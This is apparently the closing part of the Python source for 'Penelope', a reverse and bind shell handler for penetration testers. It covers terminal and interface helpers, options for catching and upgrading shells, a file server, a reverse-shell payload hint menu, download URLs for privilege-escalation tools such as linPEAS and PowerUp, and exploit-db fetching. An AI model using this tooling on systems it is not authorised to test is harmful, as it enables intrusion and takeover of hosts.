def Open(item, terminal=False):
	if OS == 'Linux' and not DISPLAY:
		logger.error("No available $DISPLAY")
		return False

	if not terminal:
		program = {'Linux':'xdg-open', 'Darwin':'open'}[OS]
		args = [item]
	else:
		program = {'Linux':'x-terminal-emulator', 'Darwin':'osascript'}[OS]
		if OS == 'Linux':
			args = ['-e', *shlex.split(item)]
		elif OS == 'Darwin':
			args = ['-e', f'tell app "Terminal" to do script "{item}"']

	if not shutil.which(program):
		logger.error(f"Cannot open window: '{program}' binary does not exist")
		return False

	process = subprocess.Popen(
		(program, *args),
		stdin=subprocess.DEVNULL,
		stdout=subprocess.DEVNULL,
		stderr=subprocess.PIPE
	)
	r, _, _ = select.select([process.stderr], [], [], .01)
	if process.stderr in r:
		error = os.read(process.stderr.fileno(), 1024)
		if error:
			logger.error(error.decode())
			return False

	return True

def ask(text):
	try:
		return input(f"\r{paint(f'[?] {text}: ').yellow}")

	except EOFError:
		return ask(text)

class Interfaces:

	def __str__(self):
		table = Table(joinchar=' : ')
		table.header = [paint('Interface').MAGENTA, paint('IP Address').MAGENTA]
		for name, ip in self.list.items():
			table += [paint(name).cyan, paint(ip).yellow]
		return str(table)

	def oneLine(self):
		return '(' + str(self).replace('\n', '|') + ')'

	def translate(self, interface_name):
		if interface_name in self.list:
			return self.list[interface_name]
		elif interface_name in ('any', 'all'):
			return '0.0.0.0'
		else:
			return interface_name

	@property
	def list(self):
		if OS == 'Linux':
			if shutil.which("ip"):
				interfaces = []
				interface_stack = []
				for line in subprocess.check_output(['ip', 'addr']).decode().splitlines():
					interface = re.search(r"^\d+: (.+?):", line)
					if interface:
						interface_stack.append(interface[1])
						continue
					ip = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", line)
					if ip:
						interfaces.append((interface_stack.pop(), ip[1]))
			else:
				logger.error("'ip' command is not available")
				return dict()

		elif OS == 'Darwin':
			if shutil.which("ifconfig"):
				output = subprocess.check_output(['ifconfig']).decode()
				interfaces = re.findall(r'^(\w+).*?\n\s+inet (?:addr:)?(\d+\.\d+\.\d+\.\d+)', output, re.MULTILINE | re.DOTALL)
			else:
				logger.error("'ifconfig' command is not available")
				return dict()

		return {i[0]:i[1] for i in interfaces}

	@property
	def list_all(self):
		return [item for item in list(self.list.keys()) + list(self.list.values())]

class Table:

	def __init__(self, list_of_lists=[], header=None, fillchar=" ", joinchar=" "):
		self.list_of_lists = list_of_lists

		self.joinchar = joinchar

		if type(fillchar) is str:
			self.fillchar = [fillchar]
		elif type(fillchar) is list:
			self.fillchar = fillchar
#		self.fillchar[0] = self.fillchar[0][0]

		self.data = []
		self.max_row_len = 0
		self.col_max_lens = []
		if header: self.header = header
		for row in self.list_of_lists:
			self += row

	@property
	def header(self):
		...

	@header.setter
	def header(self, header):
		self.add_row(header, header=True)

	def __str__(self):
		self.fill()
		return "\n".join([self.joinchar.join(row) for row in self.data])

	def __len__(self):
		return len(self.data)

	def add_row(self, row, header=False):
		row_len = len(row)
		if row_len > self.max_row_len:
			self.max_row_len = row_len

		cur_col_len = len(self.col_max_lens)
		for _ in range(row_len - cur_col_len):
			self.col_max_lens.append(0)

		for _ in range(cur_col_len - row_len):
			row.append("")

		new_row = []
		for index, element in enumerate(row):
			if not isinstance(element, (str, paint)):
				element = str(element)
			elem_length = len(element)
			new_row.append(element)
			if elem_length > self.col_max_lens[index]:
				self.col_max_lens[index] = elem_length

		if header:
			self.data.insert(0, new_row)
		else:
			self.data.append(new_row)

	def __iadd__(self, row):
		self.add_row(row)
		return self

	def fill(self):
		for row in self.data:
			for index, element in enumerate(row):
				fillchar = ' '
				if index in [*self.fillchar][1:]:
					fillchar = self.fillchar[0]

				row[index] = element + fillchar * (self.col_max_lens[index] - len(element))


class PBar:
	pbars = []

	def __init__(self, end, caption="", max_width=None):
		self.pos = 0
		self.end = end # end > 0 # TODO
		self.active = True
		self.caption = caption
		self.max_width = max_width
		__class__.pbars.append(self)

	@property
	def percent(self):
		return int(self.pos * 100 / self.end)

	def update(self, step=1):
		self.pos += step
		if self.pos > self.end:
			self.pos = self.end
		if self.active:
			self.render()

	def render(self):
		percent = self.percent
		self.active = False if percent == 100 else True
		cursor = "\x1b[?25l" if self.active else "\x1b[?25h" # __exit__ TODO
		left = f"{self.caption} ["
		right = f"] {str(percent).rjust(3)}%"
		up = f"\x1b[A" if self.active else ""
		bar_space = self.max_width if self.max_width else os.get_terminal_size().columns - len(left) - len(right)
		bars = int(percent * bar_space / 100) * "#"
		print(f'{cursor}{left}{bars.ljust(bar_space, ".")}{right}{up}')

	def terminate(self):
		print("\x1b[?25h")

class paint:
	_codes = {'RESET':0, 'BRIGHT':1, 'DIM':2, 'UNDERLINE':4, 'BLINK':5, 'NORMAL':22}
	_colors = {'black':0, 'red':1, 'green':2, 'yellow':3, 'blue':4, 'magenta':5, 'cyan':6, 'white':231, 'orange':136}
	_escape = lambda codes: f"\001\x1b[{codes}m\002"

	def __init__(self, text=None, colors=None):
		self.text = str(text) if text is not None else None
		self.colors = colors if colors is not None else []

	def __str__(self):
		if self.colors:
			content = self.text + __class__._escape(__class__._codes['RESET']) if self.text is not None else ''
			return __class__._escape(';'.join(self.colors)) + content
		return self.text

	def __len__(self):
		return len(self.text)

	def __add__(self, text):
		return str(self) + str(text)

	def __mul__(self, num):
		return __class__(self.text * num, self.colors)

	def __getattr__(self, attr):
		self.colors.clear()
		for color in attr.split('_'):
			if color in __class__._codes:
				self.colors.append(str(__class__._codes[color]))
			else:
				prefix = "3" if color in __class__._colors else "4"
				self.colors.append(prefix + "8;5;" + str(__class__._colors[color.lower()]))
		return self

class CustomFormatter(logging.Formatter):
	TEMPLATES = {
		logging.CRITICAL:	{'color':"RED",		'prefix':"[!!!]"},
		logging.ERROR:		{'color':"red",		'prefix':"[-]"},
		logging.WARNING:	{'color':"yellow",	'prefix':"[!]"},
		logging.INFO:		{'color':"green",	'prefix':"[+]"},
		logging.DEBUG:		{'color':"magenta",	'prefix':"[---DEBUG---]"}
	}
	def format(self, record):
		template = __class__.TEMPLATES[record.levelno]
		prefix = "\r" if core.attached_session is None else ""
		suffix = "\r" if core.attached_session is not None else ""
		thread = paint(" ") + paint(threading.current_thread().name).white_CYAN\
			if record.levelno is logging.DEBUG or options.debug else ""
		text = prefix + f"{template['prefix']}{thread} {logging.Formatter.format(self, record)}" + suffix
		return str(getattr(paint(text), template['color']))

##########################################################################################################

def ControlC(num, stack):
	if core.attached_session and not core.attached_session.readline:
		core.attached_session.detach()

	elif "Menu" in core.threads:
		#os.write(sys.stdout.fileno(), b'^C\n')
		#os.write(sys.stdout.fileno(), menu.prompt.encode())
		if menu.sid:
			core.sessions[menu.sid].subchannel.control << 'stop'

	elif not core.sessions:
		#print(threading.enumerate())
		core.stop()

def WinResize(num, stack):
	if core.attached_session is not None and core.attached_session.type == "PTY":
		core.attached_session.update_pty_size()

def handle_exceptions(func):
	def inner(*args, **kwargs):
		try:
			func(*args, **kwargs)
		except:
			_, e, _ = sys.exc_info()
			logger.error(e)
	return inner

def custom_excepthook(*args):
    if len(args) == 1 and hasattr(args[0], 'exc_type'):
        exc_type, exc_value, exc_traceback = args[0].exc_type, args[0].exc_value, args[0].exc_traceback
    elif len(args) == 3:
        exc_type, exc_value, exc_traceback = args
    else:
        return
    traceback.print_exception(exc_type, exc_value, exc_traceback)
    print()
    print(f"Penelope version: {__version__}")
    print(f"Python version: {sys.version}")
    print(f"System: {platform.version()}")
    menu.show()

sys.excepthook = custom_excepthook
threading.excepthook = custom_excepthook

# CONSTANTS
OS = platform.system()
OSes = {'Unix':'🐧', 'Windows':'💻'}
TTY_NORMAL = termios.tcgetattr(sys.stdin)
DISPLAY = 'DISPLAY' in os.environ
NET_BUF_SIZE = 16384
MAX_CMD_PROMPT_LEN = 335
LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
MESSENGER = inspect.getsource(Messenger)
STREAM = inspect.getsource(Stream)
AGENT = inspect.getsource(agent)
BINARIES = {
	'socat': "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat",
	'ncat': "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat",
	'linpeas': "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
	'winpeas': "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat",
	'lse': "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
	'powerup': "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1"
}

# INITIALIZATION
GID = int(os.environ.get('SUDO_GID', os.getgid()))
os.setgid(GID)
os.umask(0o007)
signal.signal(signal.SIGINT, ControlC)
signal.signal(signal.SIGWINCH, WinResize)
try:
	import readline
except ImportError:
	readline = None

## CREATE BASIC OBJECTS
core = Core()
menu = MainMenu()

# OPTIONS
class Options:
	log_levels = {"silent":'WARNING', "debug":'DEBUG'}

	def __init__(self):
		self.basedir = Path(pwd.getpwuid(GID).pw_dir) / f'.{__program__}'
		self.default_listener_port = 4444
		self.default_interface = "0.0.0.0"
		self.latency = .01
		self.histlength = 2000
		self.long_timeout = 60
		self.short_timeout = 5
		self.max_maintain = 10
		self.maintain = 1
		self.max_open_files = 5
		self.verify_ssl_cert = True
		self.proxy = ''
		self.upload_chunk_size = 51200
		self.download_chunk_size = 1048576
		self.escape = {'sequence':b'\x1b[24~', 'key':'F12'}
		self.logfile = f"{__program__}.log"
		self.debug_logfile = "debug.log"
		self.cmd_histfile = 'cmd_history'
		self.debug_histfile = 'cmd_debug_history'
		self.useragent = "Wget/1.21.2"
		self.configfile = self.basedir / 'penelope.conf'

	def __getattribute__(self, option):
		if option in ("logfile", "debug_logfile", "cmd_histfile", "debug_histfile"):
			return self.basedir / super().__getattribute__(option)
#		if option == "basedir":
#			return Path(super().__getattribute__(option))
		return super().__getattribute__(option)

	def __setattr__(self, option, value):
		show = logger.error if 'logger' in globals() else lambda x: print(paint(x).red)
		level = __class__.log_levels.get(option)

		if level:
			level = level if value else 'INFO'
			logging.getLogger(__program__).setLevel(getattr(logging, level))

		elif option == 'maintain':
			if value > self.max_maintain:
				show(f"Maintain value decreased to the max ({self.max_maintain})")
				value = self.max_maintain
			if value < 1: value = 1
			#if value == 1: show(f"Maintain value should be 2 or above")
			if value > 1 and self.single_session:
				show(f"Single Session mode disabled because Maintain is enabled")
				self.single_session = False

		elif option == 'single_session':
			if self.maintain > 1 and value:
				show(f"Single Session mode disabled because Maintain is enabled")
				value = False

		elif option == 'no_bins':
			if value is None:
				value = []
			elif type(value) is str:
				value = re.split('[^a-zA-Z0-9]+', value)

		elif option == 'proxy':
			if not value:
				os.environ.pop('http_proxy', '')
				os.environ.pop('https_proxy', '')
			else:
				os.environ['http_proxy'] = value
				os.environ['https_proxy'] = value

		elif option == 'configfile':
			self.__dict__[option] = value
			config = ConfigParser(interpolation=None)
			config.read(str(self.configfile))
			if "options" in config.sections():
				for _option, _value in config['options'].items():
					setattr(self, _option, eval(_value))

		elif option == 'basedir':
			value.mkdir(parents=True, exist_ok=True)

		if hasattr(self, option) and getattr(self, option) is not None:
			new_value_type = type(value).__name__
			orig_value_type = type(getattr(self, option)).__name__
			if new_value_type == orig_value_type:
				self.__dict__[option] = value
			else:
				show(f"Wrong value type for '{option}': Expect <{orig_value_type}>, not <{new_value_type}>")
		else:
			self.__dict__[option] = value

## DEFAULT OPTIONS
options = Options()

## COMMAND LINE OPTIONS
parser = argparse.ArgumentParser(description="Penelope Shell Handler", add_help=False)

parser.add_argument("ports", nargs='*', help="Ports to listen/connect to, depending on -i/-c options. Default: 4444")

method = parser.add_argument_group("Reverse or Bind shell?")
method.add_argument("-i", "--interface", help="Interface or IP address to listen on. Default: 0.0.0.0", metavar='')
method.add_argument("-c", "--connect", help="Bind shell Host", metavar='')

hints = parser.add_argument_group("Hints")
hints.add_argument("-a", "--hints", help="Show sample payloads for reverse shell based on the registered Listeners", action="store_true")
hints.add_argument("-l", "--interfaces", help="Show the available network interfaces", action="store_true")
hints.add_argument("-h", "--help", action="help", help="show this help message and exit")

verbosity = parser.add_argument_group("Verbosity")
verbosity.add_argument("-Q", "--silent", help="Be a bit less verbose", action="store_true")
verbosity.add_argument("-d", "--debug", help="Show debug messages", action="store_true")

log = parser.add_argument_group("Session Logging")
log.add_argument("-L", "--no-log", help="Do not create session log files", action="store_true")
log.add_argument("-T", "--no-timestamps", help="Do not include timestamps in session logs", action="store_true")

misc = parser.add_argument_group("Misc")
misc.add_argument("-r", "--configfile", help="Configuration file location", type=Path, metavar='')
misc.add_argument("-m", "--maintain", help="Maintain NUM total shells per target", type=int, metavar='')
misc.add_argument("-H", "--no-history", help="Disable shell history on target", action="store_true")
misc.add_argument("-P", "--plain", help="Just land to the main menu", action="store_true")
misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
misc.add_argument("-C", "--no-attach", help="Disable auto attaching sessions upon creation", action="store_true")
misc.add_argument("-U", "--no-upgrade", help="Do not upgrade shells", action="store_true")

misc = parser.add_argument_group("File server")
misc.add_argument("-s", "--serve", help="HTTP File Server mode", action="store_true")
misc.add_argument("-p", "--port", help="File Server port. Default: 8000", metavar='')
misc.add_argument("-pass", "--password", help="URL prefix", type=str, metavar='')

debug = parser.add_argument_group("Debug")
debug.add_argument("-N", "--no-bins", help="Simulate binary absence on target (comma separated list)", metavar='')
debug.add_argument("-v", "--version", help="Show Penelope version", action="store_true")

args = [] if not __name__ == "__main__" else None
parser.parse_args(args, options)

## LOGGERS
stdout_handler = logging.StreamHandler()
stdout_handler.setFormatter(CustomFormatter())

file_handler = logging.FileHandler(options.logfile)
file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S"))
file_handler.setLevel('INFO') # ??? TODO

debug_file_handler = logging.FileHandler(options.debug_logfile)
debug_file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s"))
debug_file_handler.addFilter(lambda record: True if record.levelno == logging.DEBUG else False)

logger = logging.getLogger(__program__)
logger.addHandler(stdout_handler)
logger.addHandler(file_handler)
logger.addHandler(debug_file_handler)

cmdlogger = logging.getLogger(f"{__program__}_cmd")
cmdlogger.setLevel(logging.INFO)
cmdlogger.addHandler(stdout_handler)

DEV_MODE = False
if DEV_MODE:
	stdout_handler.addFilter(lambda record: True if record.levelno != logging.DEBUG else False)
	logger.setLevel('DEBUG')
	options.max_maintain = 50
	options.no_bins = 'python,python3,script'

def get_glob_size(_glob, block_size):
	import glob
	from math import ceil
	def size_on_disk(filepath):
		try:
			return ceil(float(os.lstat(filepath).st_size) / block_size) * block_size
		except:
			return 0
	total_size = 0
	for part in shlex.split(_glob):
		for item in glob.glob(os.path.expanduser(part)):
			if os.path.isfile(item):
				total_size += size_on_disk(item)
			elif os.path.isdir(item):
				for root, dirs, files in os.walk(item):
					for file in files:
						filepath = os.path.join(root, file)
						total_size += size_on_disk(filepath)
	return total_size

def url_to_bytes(URL):

	# URLs with special treatment
	URL = re.sub(
		r"https://www.exploit-db.com/exploits/",
		"https://www.exploit-db.com/download/",
		URL
	)

	req = urllib.request.Request(URL, headers={'User-Agent': options.useragent})

	logger.info(paint(f"--- ⇣  Downloading {URL}").blue)
	ctx = ssl.create_default_context() if options.verify_ssl_cert else ssl._create_unverified_context()

	while True:
		try:
			response = urllib.request.urlopen(req, context=ctx, timeout=options.short_timeout)
			break
		except (urllib.error.HTTPError, TimeoutError) as e:
			logger.error(e)
		except urllib.error.URLError as e:
			logger.error(e.reason)
			if type(e.reason) == ssl.SSLCertVerificationError:
				answer = ask("Cannot verify SSL Certificate. Download anyway? (y/N)")
				if answer.lower() == 'y': # Trust the cert
					ctx = ssl._create_unverified_context()
					continue
			else:
				answer = ask("Connection error. Try again? (Y/n)")
				if answer.lower() == 'n': # Trust the cert
					pass
				else:
					continue
		return None

	filename = response.headers.get_filename()
	if filename:
		filename = filename.strip('"')
	elif URL.split('/')[-1]:
		filename = URL.split('/')[-1]
	else:
		filename = URL.split('/')[-2]
	data = response.read()
	return filename, data

def listener_menu():
	if not core.listeners:
		return False

	listener_menu.active = True
	func = None
	listener_menu.control_r, listener_menu.control_w = os.pipe()

	listener_menu.finishing = threading.Event()

	tty.setraw(sys.stdin)
	while True:
		sys.stdout.write(
			f"\x1b[?25l{paint('➤ ').white} "
			f"💀 {paint('Show Payloads').magenta} (p) "
			f"🏠 {paint('Main Menu').green} (m) "
			f"🔄 {paint('Clear').yellow} (Ctrl-L) "
			f"🚫 {paint('Quit').red} (q/Ctrl-C)\r\n"
		)
		sys.stdout.flush()

		r, _, _ = select.select([sys.stdin, listener_menu.control_r], [], [])
		if sys.stdin in r:
			command = sys.stdin.read(1).lower()
			if command == 'p':
				for listener in core.listeners.values():
					sys.stdout.write(f"\r\n{listener.hints}\r\n")
			elif command == 'm':
				func = menu.show
				break
			elif command == '\x0C':
				os.system("clear")
			elif command in ('q', '\x03'):
				func = core.stop
				break
			sys.stdout.write('\x1b[1A')
			continue
		break

	termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
	sys.stdout.write("\x1b[?25h")
	sys.stdout.flush()
	if func: func()

	os.close(listener_menu.control_r)
	listener_menu.active = False
	listener_menu.finishing.set()
	return True

def main():

	# Version
	if options.version:
		print(__version__)
		return

	# Interfaces
	elif options.interfaces:
		print(Interfaces())
		return

	# Main Menu
	elif options.plain:
		menu.show()
		return

	# File Server
	elif options.serve:
		server = FileServer(*options.ports or '.', port=options.port, host=options.interface, password=options.password)
		if server.filemap:
			server.start()
		else:
			logger.error("No files to serve")
		return

	if not options.ports:
		options.ports.append(options.default_listener_port)

	for port in options.ports:
		# Bind shell
		if options.connect:
			Connect(options.connect, port)
		# Reverse Listener
		else:
			Listener(host=options.interface, port=port)

	listener_menu()

if __name__ == "__main__":
	main()
